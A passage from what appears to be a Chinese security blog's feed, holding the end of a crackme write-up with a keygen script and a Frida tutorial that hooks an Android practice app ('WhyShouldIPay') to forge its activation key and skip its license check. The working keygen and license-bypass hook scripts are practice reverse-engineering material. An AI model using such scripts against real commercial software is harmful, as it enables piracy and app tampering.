alt="image-20201217212619373"></p><p>接下来是字符拼接</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212647428.png" alt="image-20201217212647428"></p><p>根据push关系可以推断出此处注册码为：</p><p>CW-4018-CRACKED</p><p>#####</p><p>算法脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c &#x3D; input(&quot;please input a str\n&quot;)</span><br><span class="line">temp&#x3D;eval(hex(eval(hex(ord(c[0])))*eval(&#39;0x29&#39;)*eval(&#39;0x2&#39;))) </span><br><span class="line">flag &#x3D; &quot;CW-&quot; + str(temp) + &quot;-CRACKED&quot;</span><br><span class="line">print (flag)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212906861.png" alt="image-20201217212906861"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;首先打开程序进行查看&quot;&gt;&lt;a href=&quot;#首先打开程序进行查看&quot; class=&quot;headerlink&quot; title=&quot;首先打开程序进行查看&quot;&gt;&lt;/a&gt;首先打开程序进行查看&lt;/h2&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://www.ol4three.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="crackme" scheme="http://www.ol4three.com/tags/crackme/"/>
    
  </entry>
  
  <entry>
    <title>Hook框架Frida练习（1）</title>
    <link href="http://www.ol4three.com/2020/12/04/Android/frida/Hook%E6%A1%86%E6%9E%B6Frida%E7%BB%83%E4%B9%A0%EF%BC%881%EF%BC%89/"/>
    <id>http://www.ol4three.com/2020/12/04/Android/frida/Hook%E6%A1%86%E6%9E%B6Frida%E7%BB%83%E4%B9%A0%EF%BC%881%EF%BC%89/</id>
    <published>2020-12-04T12:17:37.000Z</published>
    <updated>2021-01-05T12:20:13.675Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文章涉及到的知识点："><a href="#文章涉及到的知识点：" class="headerlink" title="文章涉及到的知识点："></a>文章涉及到的知识点：</h2><ul><li>怎么使用javascript实例化类并调用类方法</li><li>怎么在”jscode”中增加自定义javascript方法</li><li>怎么较为灵活的hook类方法</li></ul><h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Mac Os 10.15.5</span><br><span class="line">Python 3.7</span><br><span class="line">Google Nexus 6P Anroid 6.0.1</span><br><span class="line">Frida官网：https:&#x2F;&#x2F;www.frida.re&#x2F;</span><br><span class="line">Frida源码：https:&#x2F;&#x2F;github.com&#x2F;frida</span><br></pre></td></tr></table></figure><p>apk的下载地址：<a href="https://github.com/ghostmaze/Android-Reverse/raw/master/WhyShouldIPay/WhyShouldIPay.apk">whyshouldIpay</a></p><h2 id="安装APK"><a href="#安装APK" class="headerlink" title="安装APK"></a>安装APK</h2><p>下载apk安装，先看看是什么功能，简单的使用后，了解到<code>PREMIUM CONETNT</code>内容需要输入License验证后才能查看。<code>PREMIUM CONETNT</code>按钮中的内容应该是答案。</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217204346213.png" alt="image-20201217204346213" style="zoom: 33%;"><h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p>使用jadx将apk反编译出来，分析，在AndroidManifest.xml中找到了启动的Activity是<code>LauncherActivity</code></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217204804697.png" alt="image-20201217204804697"></p><p>找到其中的主要代码进行分析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public void verifyClick(View v) &#123;</span><br><span class="line">&#x2F;&#x2F;第一个验证，将输入的Licese通过网络验证，但这个肯定是通不过的，这是一个可能需要绕过的点。</span><br><span class="line">       try &#123;</span><br><span class="line">           InputStream in &#x3D; new URL(&quot;http:&#x2F;&#x2F;broken.license.server.com&#x2F;query?license&#x3D;&quot; + ((EditText) findViewById(R.id.text_license)).getText().toString()).openConnection().getInputStream();</span><br><span class="line">           StringBuilder responseBuilder &#x3D; new StringBuilder();</span><br><span class="line">           byte[] b &#x3D; new byte[0];</span><br><span class="line">           while (in.read(b) &gt; 0) &#123;</span><br><span class="line">               responseBuilder.append(b);</span><br><span class="line">           &#125;</span><br><span class="line">           String response &#x3D; responseBuilder.toString();</span><br><span class="line">           &#x2F;&#x2F;网络验证需要服务器返回 &quot;LICENSEKEYOK&quot;，才能进行下一步</span><br><span class="line">           if (response.equals(&quot;LICENSEKEYOK&quot;)) &#123;</span><br><span class="line">           &#x2F;&#x2F;当网络验证成功后，生成激活秘钥，并写入到preferences文件中</span><br><span class="line">               String activatedKey &#x3D; new String(MainActivity.xor(getMac().getBytes(), response.getBytes()));</span><br><span class="line">               SharedPreferences.Editor editor &#x3D; getApplicationContext().getSharedPreferences(&quot;preferences&quot;, 0).edit();</span><br><span class="line">               editor.putString(&quot;KEY&quot;, activatedKey);</span><br><span class="line">               &#x2F;&#x2F;这样便成功激活</span><br><span class="line">               editor.commit();</span><br><span class="line">               new AlertDialog.Builder(this).setTitle(&quot;Activation successful&quot;).setMessage(&quot;Activation successful&quot;).setIcon(17301543).show();</span><br><span class="line">               return;</span><br><span class="line">           &#125;</span><br><span class="line">           new AlertDialog.Builder(this).setTitle(&quot;Invalid license!&quot;).setMessage(&quot;Invalid license!&quot;).setIcon(17301543).show();</span><br><span class="line">       &#125; catch (Exception e) &#123;</span><br><span class="line">           new AlertDialog.Builder(this).setTitle(&quot;Error occured&quot;).setMessage(&quot;Server unreachable&quot;).setNeutralButton(&quot;OK&quot;, (DialogInterface.OnClickListener) null).setIcon(17301543).show();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>在<code>verifyClick</code>中可以知道生成激活秘钥的算法是<code>MainActivity.xor</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String activatedKey &#x3D; new String(MainActivity.xor(getMac().getBytes(), response.getBytes()));</span><br></pre></td></tr></table></figure><p>到<code>MainActivity</code>中，查看该方法，看上去算起来还是比较麻烦。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public static byte[] xor(byte[] val, byte[] key) &#123;</span><br><span class="line">    byte[] o &#x3D; new byte[val.length];</span><br><span class="line">    for (int i &#x3D; 0; i &lt; val.length; i++) &#123;</span><br><span class="line">        o[i] &#x3D; (byte) (val[i] ^ key[i % key.length]);</span><br><span class="line">    &#125;</span><br><span class="line">    return o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来当程序被激活成功后，点击<code>PREMIUM CONETNT</code>按钮，会调用<code>MainActivity</code>中的方法，可以看到它将MAC，以及生成的Key发送到了<code>MainActivity</code>中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public void showPremium(View view) &#123;</span><br><span class="line">       Intent i &#x3D; new Intent(this, MainActivity.class);</span><br><span class="line">       i.putExtra(&quot;MAC&quot;, getMac());</span><br><span class="line">       i.putExtra(&quot;KEY&quot;, getKey());</span><br><span class="line">       startActivity(i);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>在<code>MainActivity</code>的<code>onCreate</code>方法中，看到了最终答案生成的native方法<code>stringFromJNI(key, mac)</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line"> &#x2F;&#x2F;获取Intent传递过来的值</span><br><span class="line">        String key &#x3D; getIntent().getStringExtra(&quot;KEY&quot;);</span><br><span class="line">        String mac &#x3D; getIntent().getStringExtra(&quot;MAC&quot;);</span><br><span class="line">        if (key &#x3D;&#x3D; &quot;&quot; || mac &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class="line">            key &#x3D; &quot;&quot;;</span><br><span class="line">            mac &#x3D; &quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView((int) R.layout.activity_main);</span><br><span class="line">     &#x2F;&#x2F;调用native函数，算出答案</span><br><span class="line">        ((TextView) findViewById(R.id.sample_text)).setText(stringFromJNI(key, mac));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>大概过程如下：</p><ol><li>输入License，进行验证</li><li>通过网络验证获取返回值“LICENSEKEYOK”后，然后调用<code>MainActivity.xor</code>在本地<code>preferences</code>文件中生成秘钥，激活成功。</li><li>本地获取MAC地址及秘钥Key传入<code>MainActivity</code>得出答案。</li></ol><h3 id="对hook点进行分析"><a href="#对hook点进行分析" class="headerlink" title="对hook点进行分析"></a>对hook点进行分析</h3><ol><li><p>获取getMac()函数的返回值，与“LICENSEKEYOK”字符串进行xor运算得出秘钥Key.</p></li><li><p>hook getKey方法，让它不从<code>preferences</code>文件读取Key,而是我们自己构造。</p></li><li><p>hook <code>verifyClick</code>,让它调用<code>showPremium</code>方法</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229114906268.png" alt="image-20201229114906268"></p></li></ol><h3 id="代码的构造与编写"><a href="#代码的构造与编写" class="headerlink" title="代码的构造与编写"></a>代码的构造与编写</h3><h3 id="hook-getMac-函数"><a href="#hook-getMac-函数" class="headerlink" title="hook getMac()函数"></a>hook getMac()函数</h3><p>getMac() 在showPremium函数中调用，showPremium在LauncherActivity类中，所有直接通过this就能直接调用getMac()方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">js_code = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">        var hook_Activity = Java.use(&#x27;</span>de.fraunhofer.sit.premiumapp.LauncherActivity<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">        hook_Activity.showPremium.implementation = function(v)&#123;</span></span><br><span class="line"><span class="string">            var Key = this.getKey();</span></span><br><span class="line"><span class="string">            var Mac = this.getMac();</span></span><br><span class="line"><span class="string">            send(Key);</span></span><br><span class="line"><span class="string">            send(Mac);</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>完整的Python代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># -*-coding:utf-8-*-</span><br><span class="line">import frida, sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def on_message(message, data):</span><br><span class="line">    if message[&#39;type&#39;] &#x3D;&#x3D; &#39;send&#39;:</span><br><span class="line">        print(&quot;[*] &#123;0&#125;&quot;.format(message[&#39;payload&#39;]))</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">js_code &#x3D; &#39;&#39;&#39;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var hook_Activity &#x3D; Java.use(&#39;de.fraunhofer.sit.premiumapp.LauncherActivity&#39;);</span><br><span class="line">        hook_Activity.showPremium.implementation &#x3D; function(v)&#123;</span><br><span class="line">            var Key &#x3D; this.getKey();</span><br><span class="line">            var Mac &#x3D; this.getMac();</span><br><span class="line">            send(Key);</span><br><span class="line">            send(Mac);</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">process &#x3D; frida.get_usb_device().attach(&#39;de.fraunhofer.sit.premiumapp&#39;)</span><br><span class="line">script &#x3D; process.create_script(js_code)</span><br><span class="line">script.on(&#39;message&#39;, on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217210711185.png" alt="image-20201217210711185"></p><h3 id="计算密钥key"><a href="#计算密钥key" class="headerlink" title="计算密钥key"></a>计算密钥key</h3><p>接下来开始真正第一步的hook，将mac值与“LICENSEKEYOK”通过<code>MainActivity.xor</code>获取秘钥Key。那就直接hook <code>getKey</code>方法吧，这样可以自己来构造秘钥Key。<br>仔细分析，会发现在这一步中可能会遇到下面的问题：</p><ol><li>怎么调用xor方法。</li><li>java是强类型语言，javascript是弱类型语言，怎么将javascript参数进行类型转换并传递到java语言中。</li></ol><p>怎么将javascript参数进行类型转换并传递到java语言中？其实方法很简单，既然java是强类型语言，那就根据它要求的类型传递对应参数即可，看看它参数的类型。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public static byte[] xor(byte[] val, byte[] key) &#123;</span><br><span class="line">    byte[] o &#x3D; new byte[val.length];</span><br><span class="line">    for (int i &#x3D; 0; i &lt; val.length; i++) &#123;</span><br><span class="line">        o[i] &#x3D; (byte) (val[i] ^ key[i % key.length]);</span><br><span class="line">    &#125;</span><br><span class="line">    return o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么，在javascript代码中，先准备一个将字符串类型转换为byte[]类型的方法<code>stringToBytes</code>，再通过实例化<code>MainActivity</code>类的方式调用<code>xor()</code>，然后还需要一个将byte[]回转为String的方法，因为秘钥key是Sting类型的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">js_code &#x3D; &#39;&#39;&#39;</span><br><span class="line">     &#x2F;&#x2F;字符串转换byte[]的方法</span><br><span class="line">     stringToBytes &#x3D; function(str) &#123; </span><br><span class="line">        var ch, st, re &#x3D; [];</span><br><span class="line">        for (var i &#x3D; 0; i &lt; str.length; i++ ) &#123;</span><br><span class="line">            ch &#x3D; str.charCodeAt(i); </span><br><span class="line">            st &#x3D; [];                </span><br><span class="line"> </span><br><span class="line">           do &#123; </span><br><span class="line">                st.push( ch &amp; 0xFF ); </span><br><span class="line">                ch &#x3D; ch &gt;&gt; 8;         </span><br><span class="line">            &#125;   </span><br><span class="line">            while ( ch ); </span><br><span class="line">            re &#x3D; re.concat( st.reverse() );</span><br><span class="line">        &#125; </span><br><span class="line">        return re; </span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;将byte[]转成String的方法</span><br><span class="line">     function byteToString(arr) &#123; </span><br><span class="line">        if(typeof arr &#x3D;&#x3D;&#x3D; &#39;string&#39;) &#123; </span><br><span class="line">            return arr; </span><br><span class="line">        &#125; </span><br><span class="line">        var str &#x3D; &#39;&#39;, </span><br><span class="line">            _arr &#x3D; arr; </span><br><span class="line">        for(var i &#x3D; 0; i &lt; _arr.length; i++) &#123; </span><br><span class="line">            var one &#x3D; _arr[i].toString(2), </span><br><span class="line">                v &#x3D; one.match(&#x2F;^1+?(?&#x3D;0)&#x2F;); </span><br><span class="line">            if(v &amp;&amp; one.length &#x3D;&#x3D; 8) &#123; </span><br><span class="line">                var bytesLength &#x3D; v[0].length; </span><br><span class="line">                var store &#x3D; _arr[i].toString(2).slice(7 - bytesLength); </span><br><span class="line">                for(var st &#x3D; 1; st &lt; bytesLength; st++) &#123; </span><br><span class="line">                    store +&#x3D; _arr[st + i].toString(2).slice(2); </span><br><span class="line">                &#125; </span><br><span class="line">                str +&#x3D; String.fromCharCode(parseInt(store, 2)); </span><br><span class="line">                i +&#x3D; bytesLength - 1; </span><br><span class="line">            &#125; else &#123; </span><br><span class="line">                str +&#x3D; String.fromCharCode(_arr[i]); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">        return str; </span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;hook 代码</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var hook_Activity &#x3D; Java.use(&#39;de.fraunhofer.sit.premiumapp.LauncherActivity&#39;);</span><br><span class="line">        var MainActivity &#x3D; Java.use(&#39;de.fraunhofer.sit.premiumapp.MainActivity&#39;)</span><br><span class="line">        var LicenseStr &#x3D; &quot;LICENSEKEYOK&quot;;</span><br><span class="line">        &#x2F;&#x2F;hook getKey()方法，直接构造密码，而不从preferences读取</span><br><span class="line">        hook_Activity.getKey.implementation &#x3D; function()&#123;</span><br><span class="line">            &#x2F;&#x2F;获取Mac</span><br><span class="line">            var Mac &#x3D; this.getMac();</span><br><span class="line">            &#x2F;&#x2F;实例化MainActivity</span><br><span class="line">            var instance &#x3D; MainActivity.$new();</span><br><span class="line">            &#x2F;&#x2F;类型转换</span><br><span class="line">            var MacByte &#x3D;stringToBytes(Mac);</span><br><span class="line">            var LicenseByte &#x3D; stringToBytes(LicenseStr);</span><br><span class="line"> </span><br><span class="line">            send(&quot;MacByte:&quot;+MacByte)</span><br><span class="line">            send(&quot;LicenseByte:&quot;+LicenseByte)</span><br><span class="line">            &#x2F;&#x2F;调用实例化对象的xor方法</span><br><span class="line">            xorResult &#x3D; instance.xor(MacByte,LicenseByte);</span><br><span class="line">            send(xorResult);</span><br><span class="line">            &#x2F;&#x2F;类型回转</span><br><span class="line">            var Key &#x3D; byteToString(xorResult)</span><br><span class="line">            send(Key);</span><br><span class="line">            return Key;</span><br><span class="line">        &#125;</span><br><span class="line">        hook_Activity.verifyClick.implementation &#x3D; function(view)&#123;</span><br><span class="line">            this.showPremium(view);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#39;&#39;&#39;</span><br></pre></td></tr></table></figure><p>接下来，执行看看，能不能获取秘钥Key。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201225155944497.png" alt="image-20201225155944497"></p><h3 id="调用showPremium获取答案"><a href="#调用showPremium获取答案" class="headerlink" title="调用showPremium获取答案"></a>调用showPremium获取答案</h3><p>前面2个步骤，可以说是已经完成90%了，接下来只需要在hook一个能够触发showPremium方法的即可。方法就随意了，这里采用hook verifyClick的方式，这样点击app上的<code>VERIFY</code>按钮，触发verifyClick方法去调用showPremium，进而获得最终答案。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hook_Activity.verifyClick.implementation &#x3D; function(view)&#123;</span><br><span class="line">      this.showPremium(view);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>启动脚本，点击app上的<code>VERIFY</code>按钮看看执行结果：</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201225160323712.png" alt="image-20201225160323712" style="zoom:50%;"><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote><ol><li>任意类方法调用。</li><li>任意类方法重实现。<br>以及学会怎么构造和使用自定义javascript方法。</li></ol></blockquote><p>参考链接：</p><p><a href="https://bbs.pediy.com/thread-227233.htm">https://bbs.pediy.com/thread-227233.htm</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;文章涉及到的知识点：&quot;&gt;&lt;a href=&quot;#文章涉及到的知识点：&quot; class=&quot;headerlink&quot; title=&quot;文章涉及到的知识点：&quot;&gt;&lt;/a&gt;文章涉及到的知识点：&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;怎么使用javascript实例化类并调用类方法&lt;/li&gt;
&lt;l
      
    
    </summary>
    
    
      <category term="Android" scheme="http://www.ol4three.com/categories/Android/"/>
    
    
      <category term="Frida" scheme="http://www.ol4three.com/tags/Frida/"/>
    
      <category term="Hook" scheme="http://www.ol4three.com/tags/Hook/"/>
    
  </entry>
  
</feed>
